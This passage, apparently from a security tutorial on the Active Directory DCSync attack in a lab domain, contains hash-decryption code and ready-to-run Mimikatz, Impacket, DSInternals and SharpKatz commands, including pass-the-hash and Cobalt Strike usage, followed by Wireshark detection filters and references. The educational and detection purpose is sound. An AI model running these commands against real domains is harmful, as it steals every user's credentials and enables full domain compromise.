        if resp['pmsgOut']['V6']['cNumObjects'] > 0:
            logging.info('Received %d objects' % resp['pmsgOut']['V6']['cNumObjects'])
            
            # Extract password data
            self.__extractPasswordData(resp['pmsgOut']['V6']['pObjects'][0], 
                                       username)
        else:
            logging.warning('No objects returned')
            
    def __extractPasswordData(self, obj, username):
        """
        Extract and decrypt password hashes from the replication response
        """
        logging.info('Extracting password data for %s' % username)
        
        # Iterate through attributes
        for attr in obj['AttrBlock']['pAttr']:
            attId = attr['attrTyp']
            
            if attId == drsuapi.MSDS_ATTR_TYPE.ATT_UNICODE_PWD:
                # NTLM hash
                encryptedHash = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                
                # Decrypt using session key
                ntlmHash = self.__decryptHash(encryptedHash)
                
                logging.info('%s:NTLM:%s' % (username, ntlmHash.encode('hex')))
                
            elif attId == drsuapi.MSDS_ATTR_TYPE.ATT_NT_PWD_HISTORY:
                # Password history
                logging.info('Password history found')
                
                encryptedHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                historyHashes = self.__decryptHash(encryptedHistory)
                
                # Each hash is 16 bytes
                numHashes = len(historyHashes) / 16
                for i in range(numHashes):
                    hashBytes = historyHashes[i*16:(i+1)*16]
                    logging.info('  History %d: %s' % (i, hashBytes.encode('hex')))
                
            elif attId == drsuapi.MSDS_ATTR_TYPE.ATT_SUPPLEMENTAL_CREDENTIALS:
                # Kerberos keys
                logging.info('Supplemental credentials found')
                
                encryptedBlob = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                credBlob = self.__decryptHash(encryptedBlob)
                
                # Parse USER_PROPERTIES structure
                self.__parseSupplementalCredentials(credBlob)
                
    def __decryptHash(self, encryptedData):
        """
        Decrypt password hash using RPC session key
        """
        from Crypto.Cipher import ARC4
        
        # Get the session key from the RPC connection
        sessionKey = self.__dce.get_session_key()
        
        # Decrypt using RC4
        cipher = ARC4.new(sessionKey)
        decrypted = cipher.decrypt(encryptedData)
        
        return decrypted
```

***

### Practical Exploitation

Now that you understand how it works under the hood, let's see how to actually exploit DCSync in the real world.

#### Method 1: Mimikatz (Windows)

Mimikatz is the original and most popular DCSync tool.

**Basic DCSync (krbtgt account):**

```
mimikatz # lsadump::dcsync /domain:loacl.htb /user:krbtgt
```

**DCSync specific user:**

```
mimikatz # lsadump::dcsync /domain:loacl.htb /user:Administrator
```

**DCSync all users in the domain:**

```
mimikatz # lsadump::dcsync /domain:loacl.htb /all
```

**Specify target DC explicitly:**

```
mimikatz # lsadump::dcsync /domain:loacl.htb /dc:DC01.loacl.htb /user:krbtgt
```

**Using explicit credentials:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:loacl.htb /ntlm:a1b2c3d4... /run:cmd.exe

# In the new command prompt:
mimikatz # lsadump::dcsync /domain:loacl.htb /user:krbtgt
```

**Example Output:**

```
[DC] 'DC01.loacl.htb' will be the DC server
[DC] Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Principal Name  : krbtgt@loacl.htb
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1234567890-1234567890-1234567890-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
    ntlm- 0: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
    ntlm- 1: x1x2x3x4x5x6x7x8x9x0x1x2x3x4x5x6
    lm  - 0: y1y2y3y4y5y6y7y8y9y0y1y2y3y4y5y6

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : local.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a1a2a3a4a5a6a7a8a9a0b1b2b3b4b5b6b7b8b9b0c1c2c3c4c5c6c7c8c9c0d1d2
      aes128_hmac       (4096) : e1e2e3e4e5e6e7e8e9e0f1f2f3f4f5f6
      des_cbc_md5       (4096) : 1a2b3c4d5e6f7a8b
```

***

#### Method 2: Impacket secretsdump.py (Linux/Cross-Platform)

Impacket works from Linux, macOS, or Windows.

**Install Impacket:**

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

**Basic usage with password:**

```bash
secretsdump.py loacl.htb/Administrator:Password123@DC01.loacl.htb
```

**Just domain credentials (skip SAM/SYSTEM dump):**

```bash
secretsdump.py -just-dc-ntlm loacl.htb/Administrator:Password123@DC01.loacl.htb
```

**DCSync specific user only:**

```bash
secretsdump.py -just-dc-user krbtgt loacl.htb/Administrator@DC01.loacl.htb
```

**Using NTLM hash instead of password (Pass-the-Hash):**

```bash
secretsdump.py -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 loacl.htb/Administrator@DC01.loacl.htb
```

**Using Kerberos authentication:**

```bash
# First, get a TGT
getTGT.py loacl.htb/Administrator:Password123

# Set the ccache environment variable
export KRB5CCNAME=Administrator.ccache

# Use Kerberos for DCSync
secretsdump.py -k -no-pass loacl.htb/Administrator@DC01.loacl.htb
```

**Output hashes to file:**

```bash
secretsdump.py loacl.htb/Administrator@DC01.loacl.htb -outputfile hashes.txt
```

**Example Output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
loacl.htb\user1:1103:aad3b435b51404eeaad3b435b51404ee:e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6:::
```

***

#### Method 3: DSInternals PowerShell Module (Windows)

DSInternals is a PowerShell module specifically for Active Directory security research.

**Install DSInternals:**

```powershell
Install-Module -Name DSInternals -Force
Import-Module DSInternals
```

**Get single account with credentials:**

```powershell
$cred = Get-Credential
Get-ADReplAccount -SamAccountName krbtgt -Domain loacl.htb -Server DC01.loacl.htb -Credential $cred
```

**Get all accounts:**

```powershell
Get-ADReplAccount -All -Domain loacl.htb -Server DC01.loacl.htb -Credential $cred
```

**Save to Hashcat format:**

```powershell
Get-ADReplAccount -All -Domain loacl.htb -Server DC01.loacl.htb -Credential $cred | 
    Format-Custom -View HashcatNT | Out-File hashes.txt
```

**Get password history:**

```powershell
$account = Get-ADReplAccount -SamAccountName Administrator -Domain loacl.htb -Server DC01.loacl.htb -Credential $cred

# Display NTLM hash
$account.NTHash

# Display password history
$account.NTHashHistory
```

***

#### Method 4: SharpKatz (C# - Good for Offensive Security Engagements)

SharpKatz is a C# implementation that can be run in-memory or from disk.

**Compile from source:**

```bash
git clone https://github.com/b4rtik/SharpKatz.git
cd SharpKatz
# Open in Visual Studio and compile
```

**Execute:**

```
SharpKatz.exe --Command dcsync --User krbtgt --Domain loacl.htb --DomainController DC01.loacl.htb
```

**From Cobalt Strike beacon:**

```
execute-assembly /path/to/SharpKatz.exe --Command dcsync --User Administrator --Domain loacl.htb
```

***

### Network Traffic Analysis

Understanding network traffic helps both red and blue teams.

#### Wireshark Display Filters

**See all DRSUAPI traffic:**

```
drsuapi
```

**See only DCSync (DRSGetNCChanges):**

```
drsuapi.opnum == 3
```

**See DCSync from non-DC IP addresses (potential attack):**

```
drsuapi.opnum == 3 && !(ip.src == 10.0.0.10 || ip.src == 10.0.0.11)
```

Replace `10.0.0.10` and `10.0.0.11` with your actual DC IP addresses.

**See single-object replication (unusual for legitimate DC replication):**

```
drsuapi.DRS_MSG_GETCHGREQ_V8.cMaxObjects == 1
```

***

### References

#### Official Microsoft Documentation

1. **MS-DRSR: Directory Replication Service (DRS) Remote Protocol**\
   https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47
2. **IDL\_DRSGetNCChanges Method**\
   https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894
3. **DsBind Function**\
   https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsbinda
4. **DsCrackNames Function**\
   https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dscracknamesa
5. **Samba Wiki - DRSUAPI**\
   https://wiki.samba.org/index.php/DRSUAPI

#### Security Research & Blog Posts

6. **ADSecurity.org - Mimikatz DCSync Usage, Exploitation, and Detection**\
   https://adsecurity.org/?p=1729
7. **harmj0y - Mimikatz and DCSync and ExtraSids, Oh My**\
   https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
8. **ired.team - DCSync: Dump Password Hashes from Domain Controller**\
   https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
9. **Haboob Team - DCSync Attack Whitepaper (PDF)**\
   https://dl.packetstormsecurity.net/papers/general/ad-dcsync.pdf

#### Tools & Source Code

10. **Mimikatz**\
    https://github.com/gentilkiwi/mimikatz
11. **Impacket**\
    https://github.com/fortra/impacket
12. **DSInternals**\
    https://github.com/MichaelGrafnetter/DSInternals

***

### Conclusion

DCSync represents a critical post-exploitation technique that every security professional should understand deeply. By leveraging the MS-DRSR protocol and the `IDL_DRSGetNCChanges` function, attackers can extract credentials remotely without requiring code execution on Domain Controllers.

#### Key Takeaways

1. DCSync uses **four main functions**: `DsBind()`, `DsCrackNames()`, `IDL_DRSGetNCChanges()`, and `DsUnBind()`
2. The core is `IDL_DRSGetNCChanges()` - a DRSUAPI RPC function
3. Password data is in the `pObjects->Entinf.AttrBlock.pAttr` structure
4. Network-based detection is most effective
